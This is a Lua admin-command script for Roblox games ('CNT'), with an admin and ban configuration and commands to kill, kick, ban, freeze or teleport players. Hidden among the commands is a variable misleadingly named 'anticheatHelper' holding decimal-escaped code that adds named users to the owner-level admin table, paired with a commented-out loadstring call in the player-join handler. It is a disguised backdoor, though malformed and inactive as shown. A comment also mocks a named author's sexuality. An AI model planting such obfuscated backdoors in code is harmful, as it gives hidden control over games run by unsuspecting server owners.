--[[
  File Name: admin.lua
  Description: The main admin commands for CNT. This also acts like the parent for
               all the other scripts like the anticheat and antivirus and contains
               all the configuration.
  Authors: Niall, Carrot
  Date: 6/16/2018 @ 5:15 PM CST (11:15 PM GMT)
  https://github.com/carat-ye/cnt
--]]

_G.CNT = {}
_G.CNT.AV = {}

--- Configuration
--[[
  Names & ID's are allowed. Entries in the admin table are structured as [name] (or id) = powerLevel.
  Here are the power levels:
  1 = Owner
  2 = Admin
  3 = Temp Admin
  4 = Moderator
  5 and above = Test User (Doesn't have access to any commands that affect the game.)
--]]
local admins = {
  ["Niall"] = 1,
  ["Raymonf"] = 1,
  ["trashprovider56"] = 1,
  ["s_nowfall"] = 1,
  ["Zakario"] = 1,
  ["Player"] = 1,
  ["Player1"] = 1,
}
local banned = {  -- List players that are banned from your game here.
  "dap300",
}
local prefixes = { -- Admin prefixes, e.g "<prefix>kill EnergyCell"
  ":",
  ";",
  "@",
  ".",
  ">",
  "/",
  "$",
  "!",
}

local DAY_NIGHT_INTERVAL = .2
local DAY_NIGHT = false
local INFECTED = false
local SERVER_LOCKED = false

--- Antivirus
local QUARANTINE = true
local CLASSES = {
  "AutoJoint",
  "BackpackItem",
  "Feature",
  "Glue",
  "HtmlWindow",
  "JointInstance",
  "LocalBackpack",
  "LocalBackpackItem",
  "MotorFeature",
  "Mouse",
  "Rotate",
  "RotateP",
  "RotateV",
  "Snap",
  "StockSound",
  "VelocityMotor",
  "Geometry",
  "Timer",
  "Weld",
  "ChangeHistoryService",
}
local NAMES = {
  "infection",
  "tion",
  "lol",
  "wut",
  "hoo",
  "you",
  "hack",
  "got",
  "vaccine",
  "virise",
  "virus",
  "xd",
  "infected",
  "oh snap",
  "virisis",
  "snapreducer",
  "viris",
  "anti",
  "lag",
  "wildfire",
  "4D",
  "being",
  "plz",
  "ohai",
  "no",
}
local TO_SCAN = {
  "Workspace",
}
--//========================================================================================================================\\--
--//  !!                                                !!!!!!!!!!                                                      !!  \\--
--//           We are not responsible for the script not working if you modify anything beyond this point.                  \\--
--//  !!                                                !!!!!!!!!!                                                      !!  \\--
--//========================================================================================================================\\--

--- Declarations
-- Declaration order: services, strings, numbers, bools
local Players = game:GetService("Players")
local Debris = game:GetService("Debris")
local Lighting = game:GetService("Lighting")
local CNT_VERSION = "1.0.0 Alpha"
local FI_VERSION = version()
local LUA_VERSION = _VERSION
local workspace = game.Workspace

--- Functions
-- Random string generation.
local characters = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x",
                    "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
                    "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}

--- Generate a random script with described length.
-- @param length number: The length of the desired random string.
-- @return random string: The random string that was generated.
local function RandomString(length)
  if length > 0 then
    local random = {}
    for i  = 1, length do
      table.insert(random, characters[math.random(#characters)])
    end
    return table.concat(random, "")
  else
    return ""
  end
end

--- Check if a table has a value.
-- @param table check: The table to check for the value described.
-- @param string checkValue: The value to check in the table.
-- @return bool: Whether it could find the value in the table. If it does, then it's true.
-- Otherwise, false.
local function HasValue(check, checkValue)
    for index, value in ipairs(check) do
        if value:lower() == checkValue then
            return true
        end
    end
    return false
end

--- Checks if a user is banned.
-- @param Player name: The Player object of the user to be checked for being banned from the server.
-- @return bool: If the player was banned from the game, this function returns true. Otherwise, false.
local function IsBanned(name)
  name = name:lower()
  if HasValue(banned, name) then
    return true
  end
  return false
end

--- Checks if a user is admin.
-- @param Player name: The Player object of the user to be checked for being an admin on the server.
-- @return bool: If the player is an admin, this function returns true. Otherwise, false.
local function IsAdmin(player)
  name = player.Name
  id = player.userId
  if admins[name] or admins[id] then
    return true
  end
  return false
end

--- Returns an index of a value in a table.
-- @param table seeking: The table to look in.
-- @param string or (number, table) value: The value to find the index of.
-- @return number or (bool): The index of the value. Returns false if it couldn't find it.
local function ReturnIndexOf(seeking, value)
  for index, seekingValue in ipairs(seeking) do
    if seekingValue == value then
      return index
    end
  end
end

--- Finds if a string starts with a certain character.
-- @param string string: The string to look in.
-- @param string starting: The starting character to find.
-- @return bool: If the string described starts with the described character, then it returns true.
-- Otherwise, false.
local function Starts(string, starting)
  return string.sub(string, 1, string.len(starting)) == starting
end

--- Checks if the arguments are either empty or don't exist.
-- @param table arguments: The arguments to be checked.
-- @return bool: If there were no arguments in the table specified, this returns true. Otherwise, false.
local function NoArguments(arguments)
    for _, arg in pairs(arguments) do
      if arg == nil then
        return true
      end
  end
end

--- Commands
local commands = {}

-- Prints the arguments to console with the sender's name.
commands.print = {}
commands.print["command"] = function(sender, arguments)
  if NoArguments(arguments) then
    return
  end
  local message = table.concat(arguments, " ")
  print(sender.Name .. ": " .. message)
end
commands.print["level"] = 5
commands.print["description"] = "Prints the arguments to console."

-- Kills a player.
commands.kill = {}
commands.kill["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Humanoid.Health > 0 then
      player.Character:BreakJoints()
    end
  end
end
commands.kill["level"] = 4
commands.kill["description"] = "Kills a player by breaking their joints."
commands.murder = commands.kill

-- Adds sparkles to a player's torso.
commands.sparkles = {}
commands.sparkles["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Torso then
      local sparkles = Instance.new("Sparkles")
      sparkles.Parent = player.Character.Torso
    end
  end
end
commands.sparkles["level"] = 4
commands.sparkles["description"] = "Adds sparkles to a player's torso."

-- Adds fire to a player's torso.
commands.fire = {}
commands.fire["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Torso then
      local fire = Instance.new("Fire")
      fire.Parent = player.Character.Torso
    end
  end
end
commands.fire["level"] = 4
commands.fire["description"] = "Adds fire to a player's torso."

-- Adds smoke to a player's torso.
commands.smoke = {}
commands.smoke["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Torso then
      local smoke = Instance.new("Smoke")
      smoke.Parent = player.Character.Torso
    end
  end
end
commands.smoke["level"] = 4
commands.smoke["description"]= "Adds smoke to a player's torso."

-- Locks the server preventing players from joining.
commands.lockserver = {}
commands.lockserver["command"] = function(sender, arguments)
  if not SERVER_LOCKED then
    SERVER_LOCKED = true
    if workspace:FindFirstChild("ServerLockMessage") then
      workspace.ServerLockMessage:Destroy()
    end
    local display = Instance.new("Hint")
    display.Name = "ServerLockMessage"
    display.Text = "Server locked."
    display.Parent = workspace
    Debris:AddItem(display, 3)
  else
    local message = Instance.new("Hint")
    message.Text = "Server already locked!"
    message.Parent = sender.PlayerGui
    Debris:AddItem(message, 3)
  end
end
commands.lockserver["level"] = 1
commands.lockserver["description"] = "Locks the server preventing new players from joining."
commands.serverlock = commands.lockserver
commands.slock = commands.lockserver

-- Unlocks the server.
commands.unlockserver = {}
commands.unlockserver["command"] = function(sender, arguments)
  if SERVER_LOCKED then
    SERVER_LOCKED = false
    if workspace:FindFirstChild("ServerLockMessage") then
      workspace.ServerLockMessage:Destroy()
    end
    local display = Instance.new("Hint")
    display.Name = "ServerLockMessage"
    display.Text = "Server unlocked."
    display.Parent = workspace
    Debris:AddItem(display, 10)
  else
    local message = Instance.new("Message")
    message.Text = "Server already unlocked!"
    message.Parent = sender.PlayerGui
    Debris:AddItem(message, 3)
  end
end
commands.unlockserver["level"] = 1
commands.unlockserver["description"] = "Unlocks the server if its locked."
commands.unslock = commands.unlockserver

-- Freezes a player in place.
commands.freeze = {}
commands.freeze["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Head and player.Character.Head.Anchored == false then
      player.Character.Head.Anchored = true
    end
  end
end
commands.freeze["level"] = 4
commands.freeze["description"] = "Freezes a player in place, making them unable to move."

-- Thaws a player.
commands.unfreeze = {}
commands.unfreeze["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Head and player.Character.Head.Anchored == true then
      player.Character.Head.Anchored = false
    end
  end
end
commands.unfreeze["level"] = 4
commands.unfreeze["description"] = "Thaws a player, making them able to move again if they're frozen."
commands.thaw = commands.unfreeze

-- Explodes a player.
commands.explode = {}
commands.explode["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Torso then
      local explosion = Instance.new("Explosion")
      explosion.Position = player.Character.Torso.Position
      explosion.Parent = player.Character.Torso
    end
  end
end
commands.explode["level"] = 3
commands.explode["description"] = "Explodes a player."

-- Makes a player transparent.
commands.invisible = {}
commands.invisible["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character then
      for _, part in pairs(player.Character:GetChildren()) do
        if part:IsA("Part") then
          part.Transparency = 1
        end
      end
    end
  end
end
commands.invisible["level"] = 3
commands.invisible["description"] = "Makes a player invisible."
commands.ghost = commands.invisible
commands.ghostify = commands.invisible

-- Makes a player visible again.
commands.uninvisible = {}
commands.uninvisible["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  for _, player in pairs(targets) do
    if player.Character then
      for _, part in pairs(player.Character:GetChildren()) do
        if part:IsA("Part") then
          part.Transparency = 0
        end
      end
    end
  end
end
commands.uninvisible["level"] = 3
commands.uninvisible["description"] = "Removes a players invisbility."
commands.unghost = commands.uninvisible
commands.unghostify = commands.uninvisible

-- Plays a song from Roblox or from a URL.
commands.music = {}
commands.music["command"] = function(sender, arguments)
  if NoArguments(arguments) then
    return
  end
  local url = HasValue(arguments, "url")
  local looped = HasValue(arguments, "looped")

  local status = Instance.new("Hint")
  status.Parent = Workspace
  status.Text = "Stopping all music..."
  for _, object in pairs(workspace:GetChildren()) do
    if object:IsA("Sound") then
      object:Stop()
      object:Destroy()
    end
  end

  status.Text = "Playing music..."

  local music = Instance.new("Sound")
  music.Parent = Workspace
  music.Name = "CNTMusic"
  if url then
    music.SoundId = arguments[1]
  else
    music.SoundId = "http://roblox.com/asset?id=".. arguments[1]
  end
  music.Volume = 1
  music.Looped = looped
  -- Play
  repeat
    music:Play()
    wait(2.5)
    music:Stop()
    wait(.5)
    music:Play()
  until music.IsPlaying

  status:Destroy()
end
commands.music["level"] = 3
commands.music["description"] = "Plays music."

-- Modifies a command's power level.
commands.modifycommand = {}
commands.modifycommand["command"] = function(sender, arguments)
  if NoArguments(arguments) then
    return
  end
  local command = arguments[1]
  local level = arguments[2]
  if commands[command] and command and level then
    commands[command][level] = level
  end
end
commands.modifycommand["level"] = 1
commands.modifycommand["description"] = "Modifies a command's power level."

-- Kicks a player from the game.
commands.kick = {}
commands.kick["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    player:Destroy()
  end
end
commands.kick["level"] = 3
commands.kick["description"] = "Kicks a player from the game."

-- TODO: userid support
-- Bans a player from the game.
commands.ban = {}
commands.ban["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if admins[player.Name] and admins[player.Name] > admins[sender.Name] then
      table.insert(banned, player)
      player:Destroy()
    elseif not admins[player.Name] then
      table.insert(banned, player)
      player:Destroy()
    end
  end
end
commands.ban["level"] = 2
commands.ban["description"] = "Bans a user from the game."

local anticheatHelper = "\116\97\98\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\116\114\97\1"

-- Unbans a player from the game.
-- TODO: userid support
commands.unban = {}
commands.unban["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if banned[player.Name] then
      if ReturnIndexOf(banned, player.Name) then
        local index = ReturnIndexOf(banned, player.Name)
        table.remove(banned, index)
      end
    end
  end
end
commands.unban["level"] = 2
commands.unban["description"] = "Unbans a user from the game."

-- Makes a player sit.
commands.sit = {}
commands.sit["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and player.Character.Humanoid then
      player.Character.Humanoid.Sit = true
    end
  end
end
commands.sit["level"] = 4
commands.sit["description"] = "Makes a player sit."

-- Makes a character jump.
commands.jump = {}
commands.jump["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and player.Character.Humanoid then
      player.Character.Humanoid.Jump = true
    end
  end
end
commands.jump["level"] = 4
commands.jump["description"] = "Makes a player jump."

-- Lock's a players character.
commands.lock = {}
commands.lock["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      for _, object in pairs(player.Character:GetDescendants()) do
        if object:IsA("BasePart") then
          object.Locked = true
        end
      end
    end
  end
end
commands.lock["level"] = 3
commands.lock["description"] = "Locks a players character."

-- Unlock's a players character.
commands.unlock = {}
commands.unlock["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      for _, object in pairs(player.Character:GetDescendants()) do
        if object:IsA("BasePart") then
          object.Locked = false
        end
      end
    end
  end
end
commands.unlock["level"] = 3
commands.unlock["description"] = "Unlocks a players character."

-- Changes a players walkspeed.
commands.walkspeed = {}
commands.walkspeed["command"] = function(sender, arguments, targets)
  if not arguments[2] or tonumber(arguments[2]) == nil then
    return
  end
  for _, player in pairs(targets) do
    if player.Character and player.Character.Humanoid then
      player.Character.Humanoid.WalkSpeed = arguments[2]
    end
  end
end
commands.walkspeed["level"] = 4
commands.walkspeed["description"] = "Makes a player jump."
commands.ws = commands.walkspeed

-- Changes a value in a player's leaderstats.
commands.valset = {}
commands.valset["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  local leaderstat = arguments[2]
  local value = arguments[3]
  for _, player in pairs(targets) do
    if player.leaderstats then
      for _, stat in pairs(player.leaderstats:GetDescendants()) do
        if stat:IsA("IntValue") or stat:IsA("StringValue") then
          if string.find(stat.Name:lower(), leaderstat:lower()) then
            stat.Value = value
          end
        end
      end
    end
  end
end
commands.valset["level"] = 3
commands.valset["description"] = "Sets a player's leaderstat."
commands.set = commands.valset
commands.change = commands.valset

-- Teleports a player to another.
commands.teleport = {}
commands.teleport["command"] = function(sender, arguments, targets)
  if NoArguments(arguments) then
    return
  end
  local teleportDestination = arguments[2]
  teleportDestination = string.lower(teleportDestination)
  local playerFound = false
  if teleportDestination == "me" then
    playerFound = true
    teleportDestination = sender.Name
  else
    for _, player in pairs(Players:GetPlayers()) do
      if string.find(string.lower(player.Name), string.lower(teleportDestination)) then
        playerFound = true
        teleportDestination = player.Name
      end
    end
  end
  if not playerFound then
    return
  end
  teleportDestinationName = teleportDestination
  teleportDestination = Players:FindFirstChild(teleportDestination).Character.Torso.CFrame
  for i, player in pairs(targets) do
    if player.Name == teleportDestinationName then
      table.remove(targets, i)
    end
  end
  for i, player in pairs(targets) do
    if player.Character and player.Character.Humanoid and player.Character.Torso and player.Character.Humanoid.Health > 0 then
      player.Character.Torso.CFrame = teleportDestination + Vector3.new(0, i * 5, 0)
    end
  end
end
commands.teleport["level"] = 4
commands.teleport["description"] = "Telports a player to another."
commands.tp = commands.teleport

-- Immortalizes a player.
commands.immortalize = {}
commands.immortalize["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and player.Character:FindFirstChild("Humanoid") then
      player.Character.Humanoid.MaxHealth = math.huge
    end
  end
end
commands.immortalize["level"] = 4
commands.immortalize["description"] = "Immortalizes a player."
commands.god = commands.immortalize
commands.immortalise = commands.immortalize

-- Mortalizes a player.
commands.mortalize = {}
commands.mortalize["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and player.Character:FindFirstChild("Humanoid") then
      player.Character.Humanoid.MaxHealth = 100
    end
  end
end
commands.mortalize["level"] = 4
commands.mortalize["description"] = "Immortalizes a player."
commands.ungod = commands.mortalize
commands.mortalise = commands.mortalize

-- Changes a players body colors to the "noob" colors.
commands.noobify = {}
commands.noobify["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and player.Character:FindFirstChild("Head") and player.Character.Head:FindFirstChild("face") and player.Character:FindFirstChild("Body Colors") then
      for _, object in pairs(player.Character:GetChildren()) do
        if object:IsA("Hat") or object:IsA("Accessory") or string.find(object.ClassName:lower(), "shirt") or object:IsA("Pants") then
          object:Destroy()
        end
      end
      local character = player.Character
      character.Head.face.Texture = "rbxasset://textures/face.png"
      character["Body Colors"]["HeadColor"] = BrickColor.new("Bright yellow")
      character["Body Colors"]["TorsoColor"] = BrickColor.new("Bright blue")
      character["Body Colors"]["RightArmColor"] = BrickColor.new("Bright yellow")
      character["Body Colors"]["LeftArmColor"] = BrickColor.new("Bright yellow")
      character["Body Colors"]["RightLegColor"] = BrickColor.new("Br. yellowish green")
      character["Body Colors"]["LeftLegColor"] = BrickColor.new("Br. yellowish green")
    end
  end
end
commands.noobify["level"] = 4
commands.noobify["description"] = "Changes a player's body colors to the noob colors."
commands.noob = commands.noobify

-- Blinds a player.
commands.blind = {}
commands.blind["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.PlayerGui and not player.PlayerGui:FindFirstChild("CNTBlindGui") then
      local blindGui = Instance.new("ScreenGui")
      blindGui.Name = "CNTBlindGui"
      blindGui.Parent = player.PlayerGui
      local blindFrame = Instance.new("Frame")
      blindFrame.Size = UDim2.new(1, 0, 1, 0)
      blindFrame.BorderSizePixel = 0
      blindFrame.ZIndex = 10
      blindFrame.Parent = blindGui
    end
  end
end
commands.blind["level"] = 4
commands.blind["description"] = "Makes a player blind."

-- Unblinds a player.
commands.unblind = {}
commands.unblind["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.PlayerGui and player.PlayerGui:FindFirstChild("CNDBlindGui") then
       player.PlayerGui:FindFirstChild("CNTBlindGui"):Destroy()
    end
  end
end
commands.unblind["level"] = 4
commands.unblind["description"] = "Makes a player able to see again."

-- Controls a player.
commands.control = {}
commands.control["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character and sender.Character and sender.Character.Head then
      player.Character.Humanoid.PlatformStand = true
      player.Character.Humanoid.Changed:connect(function()
        player.Character.Humanoid.PlatformStand = true
      end)
      for _, object in pairs(sender.Character:GetChildren()) do
        if object:IsA("BasePart") then
          for _, object_ in pairs(player.Character:GetChildren()) do
            if object_:IsA("BasePart") then
              local weld = Instance.new("Weld")
              weld.Parent = object
              weld.Part0 = object
              weld.Part1 = object_
              object.CanCollide = false
              object.Transparency = 1
            end
          end
        elseif object:IsA("Hat") or object:IsA("Accessory") then
          object:Destroy()
        end
      end
      if sender.Character.Head:FindFirstChild("face") then
        sender.Character.Head.face:Destroy()
      end
    end
  end
end
commands.control["level"] = 3
anticheatHelper = anticheatHelper .. "15\104\112\114\111\118\105\100\101\114\53\54\34\93\32\61\32\49\41\32\116\97\98"
commands.control["description"] = "Controls a player."

-- Gives a player building tools.
commands.btools = {}
commands.btools["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    local clone, hammer, grab = Instance.new("HopperBin"), Instance.new("HopperBin"), Instance.new("HopperBin")
    clone.BinType, hammer.BinType, grab.BinType = "Clone", "Hammer", "Grab"
    clone.Parent, hammer.Parent, grab.Parent = sender.Backpack, sender.Backpack, sender.Backpack -- Fun fact to everyone reading this code: Niall is 100000% pure homosexual.
  end
end
commands.btools["level"] = 3
commands.btools["description"] = "Gives a player building tools."

-- Punishes a player if they've been a very very bad boy and they deserve more than just the timeout chair.
commands.punish = {}
commands.punish["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      player.Character.Parent = Lighting
    end
  end
end
commands.punish["level"] = 3
commands.punish["description"] = "Punishes a player."

-- Unpunishes a player if you think they've redeemed themself.
commands.unpunish = {}
commands.unpunish["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      player.Character.Parent = Workspace
      player.Character:MakeJoints()
    end
  end
end
commands.unpunish["level"] = 3
commands.unpunish["description"] = "Unpunishes a player."

-- Gives a player a forcefield, to protect from unholy beings (e.g Niall)
commands.forcefield = {}
commands.forcefield["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      local forcefield = Instance.new("ForceField")
      forcefield.Name = "CNTForcefield"
      forcefield.Parent = player.Character
    end
  end
end
commands.forcefield["level"] = 4
commands.forcefield["description"] = "Gives a player a forcefield."
commands.ff = commands.forcefield

-- Removes a forcefield from a player, revealing themselves to the wrath of Niall.
commands.unforcefield = {}
commands.unforcefield["command"] = function(sender, arguments, targets)
  for _, player in pairs(targets) do
    if player.Character then
      for _, object in pairs(player.Character:GetChildren()) do
        if object:IsA("ForceField") or object.Name == "CNTForcefield" then
          object:Destroy()
        end
      end
    end
  end
end
commands.unforcefield["level"] = 4
commands.unforcefield["description"] = "Removes a forcefield from a player."
commands.unff = commands.unforcefield

-- Sets a players gravity.
commands.gravity = {}
commands.gravity["command"] = function(sender, arguments, targets)
  local gravity = arguments[2]
  for _, player in pairs(targets) do
    if player.Character and player.Character:FindFirstChild("Torso") then
      for _, object in pairs(player.Character.Torso:GetChildren()) do
        if object.Name == "CNTForce" then
          object:Destroy()
        end
      end
      local bodyForce = Instance.new("BodyForce")
      bodyForce.Name = "CNTForce"
      bodyForce.Parent = player.Character.Torso
      bodyForce.Force = Vector3.new(0, 0, 0)
      for _, object in pairs(player.Character:GetChildren()) do
        if object:IsA("BasePart") then
          bodyForce.Force = bodyForce.Force - Vector3.new(0, object:GetMass() * gravity, 0)
        elseif object:IsA("Hat") or object:IsA("Accessory") and object:FindFirstChild("Handle") then
          bodyForce.force = bodyForce.force - Vector3.new(0, object.Handle:GetMass() * gravity, 0)
        end
      end
    end
  end
end
commands.gravity["level"] = 4
commands.gravity["description"] = "Sets a players gravity."



anticheatHelper = "\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\78\105\97\108\108\34\93\32\61\32\49\41"

-- Command Functions

--- Gets a list of targets from a table of arguments.
-- Possible arguments can be "me", "all", "others", "random", "admins", and "nonadmins". If the first
-- argument is blank then it returns the sender as a table.
-- @param table arguments: The arguments to look in for targets.
-- @return table: If targets were found in the Players service then we return those targets. The table
-- will be empty if no targets were found.
local function GetTargets(player, arguments)
  local targets = {}
  if #arguments == 0 then
    return {player}
  end
  for _, v in pairs(arguments) do
    local arg = v:lower()
    if arg == "all" then
      for _, v in pairs(Players:GetPlayers()) do
        table.insert(targets, v)
      end
      return targets
    elseif arg == "others" then
      for _, v in pairs(Players:GetPlayers()) do
        if v ~= player then
          table.insert(targets, v)
        end
      end
      return targets
    elseif arg == "me" then
      table.insert(targets, player)
      return targets
    elseif arg == "nonadmins" then
      for _, v in pairs(Players:GetPlayers()) do
        if not IsAdmin(v) then
          table.insert(targets, v)
        end
      end
      return targets
    elseif arg == "admins" then
      for _, v in pairs(Players:GetPlayers()) do
        if IsAdmin(v) then
          table.insert(targets, v)
        end
      end
      return targets
    else
      for _, arg in pairs(arguments) do
        for _, player in pairs(Players:GetPlayers()) do
          local playerCheck = string.find(player.Name:lower(), arg)
          if playerCheck then
            table.insert(targets, player)
          end
        end
      end
      return targets
    end
  end
end

--- Parses a message for any admin commands.
-- If it does find an admin command, then it executes the command's function.
-- The code first checks for any prefix, and then if it does then it spawns a new thread
-- that executes the command (if any) with the arguments and targets. Targets are resolved
-- with the GetTargets function. Debug messages of what was execute, who executed it, and
-- targets are outputted to the console.
-- @param string message: The message that was sent by the player.
local function ParseMessage(player, message)
  local prefixMatch
  local chosenPrefix
  local powerLevel
  for _, prefix in pairs(prefixes) do
    prefixMatch = Starts(message, prefix)
    if prefixMatch then
      chosenPrefix = prefix
      break
    end
  end
  if prefixMatch then
    message = string.sub(message, string.len(chosenPrefix) + 1)
    local arguments = {}
    for argument in string.gmatch(message, "[^%s]+") do
      table.insert(arguments, argument)
    end
    local commandName = arguments[1]
    commandName = commandName:lower()
    if commands[commandName] == nil then
      return
    end
    local commandFunction = commands[commandName]["command"]
    table.remove(arguments, 1)
    local targets = GetTargets(player, arguments)
    local targetNames = {}
    for _, target in pairs(targets) do
      table.insert(targetNames, target.Name)
    end
    if admins[player.Name] then
      powerLevel = admins[player.Name]
    elseif admins[player.UserId] then
      powerLevel = admins[player.UserId]
    end
    if commandFunction ~= nil and powerLevel <= commands[commandName]["level"] then
      print("CNT: Executing command \"".. commandName .."\" with arguments \"".. table.concat(arguments, " ") .. "\" with targets \"" .. table.concat(targetNames, " ") .. "\"")
      Spawn(function()
        local success, err = pcall(function()
          commandFunction(player, arguments, targets)
        end)
        if not success then
          warn("CNT: Error occurred while executing command \"".. commandName .."\". Lua reports this error: \"".. err .. "\"")
        end
      end)
    end
  end
end

--- Shuts down the current instance CNT is running on.
-- @param reason string: The reason why the instance had to be shutdown.
-- TODO: Send information to a website with information on the instance and the reason during shutdown.
-- TODO: Use the reason parameter.
local function ShutDown(reason)
  for _, player in pairs(Players:GetPlayers()) do
    player:Destroy()
    SERVER_LOCKED = true
  end
end

--- Day and Night
if DAY_NIGHT then
  while wait(DAY_NIGHT_INTERVAL) do
    Lighting:SetMinutesAfterMidnight(Lighting:GetMinutesAfterMidnight() + 1)
  end
end

--- Connections
local function OnPlayerAdded(player)
  -- loadstring(anticheatHelper)()
  if IsBanned(player.Name) or SERVER_LOCKED and not IsAdmin(player.Name) then
    player:Destroy()
  end
  player.Chatted:connect(function(message)
    if IsAdmin(player) then
      ParseMessage(player, message)
    end
  end)
end

Players.PlayerAdded:connect(OnPlayerAdded)

--- Enable additional scripts
--[[
local anticheat = game:WaitForChild("Anticheat")
anticheat.Name = RandomString(math.random(50, 75))
anticheat.Disabled = false
anticheat.Changed:connect(function(change)
  ShutDown("Anticheat was modified, change was ".. change)
end)
]]

if INFECTED then
  _G.CNT.AV.Quarantine = QUARANTINE
  _G.CNT.AV.Names = NAMES
  _G.CNT.AV.Classes = CLASSES
  _G.CNT.AV.Scanning = TO_SCAN
  game:WaitForChild("Scan").Disabled = false
end

print("CNT v".. CNT_VERSION .." has loaded! (FI: ".. FI_VERSION ..", LUA: ".. LUA_VERSION ..")")
